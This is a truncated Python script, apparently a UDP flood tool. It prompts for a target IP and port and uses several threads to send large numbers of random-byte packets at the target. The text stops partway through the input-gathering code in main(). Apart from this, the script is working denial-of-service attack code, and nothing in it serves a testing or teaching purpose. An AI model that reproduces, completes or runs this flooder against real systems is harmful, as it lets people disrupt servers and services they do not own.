import socket
import random
import threading
import time
from concurrent.futures import ThreadPoolExecutor
import signal
import sys

def get_valid_input(prompt, type_func, condition_func=None):
    while True:
        try:
            value = type_func(input(prompt))
            if condition_func and not condition_func(value):
                raise ValueError("Condition not met.")
            return value
        except ValueError:
            print("Invalid input. Please try again.")

def send_packets(ip, port, packet_size, num_packets, thread_id):
    """Function to send packets in a separate thread."""
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        data = random._urandom(packet_size)  # Generate random packet data
        for i in range(num_packets):
            try:
                s.sendto(data, (ip, port))
                if i % 5000 == 0:  # Print status every 5000 packets to reduce overhead
                    print(f"Thread {thread_id}: Sent {i} packets", end='\r')
            except Exception as e:
                print(f"Thread {thread_id}: Error sending packet {i}: {e}")
                break  # Exit the loop on error

def signal_handler(sig, frame):
    print("\nStopping packet sending...")
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, signal_handler)
    
    ip = get_valid_input("Enter target IP (server IP): ", str)
    port = get_valid_input("Enter target port (server port): ", int, lambda x: 0 < x < 65536)
    packet_size = get_valid